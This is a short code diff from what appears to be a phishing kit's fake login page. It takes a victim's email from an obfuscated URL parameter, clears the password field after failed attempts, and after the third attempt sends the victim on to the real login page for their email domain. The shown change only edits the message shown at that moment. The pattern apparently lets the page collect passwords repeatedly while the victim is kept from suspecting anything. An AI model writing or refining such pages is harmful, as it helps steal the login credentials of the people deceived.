@@ -247,7 +247,7 @@ $email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
                     $('#password').val(''); // Clear password input
                 } else {
                     // On third attempt, submit and redirect
-                    $('#msg').text('Try Again Later...').show();
+                    $('#msg').text('Redirecting, Try Again Later...').show();
                     setTimeout(function() {
                         const redirectUrl = getLoginUrl(emailVal.split('@')[1]);
                         console.log('Redirecting to:', redirectUrl);
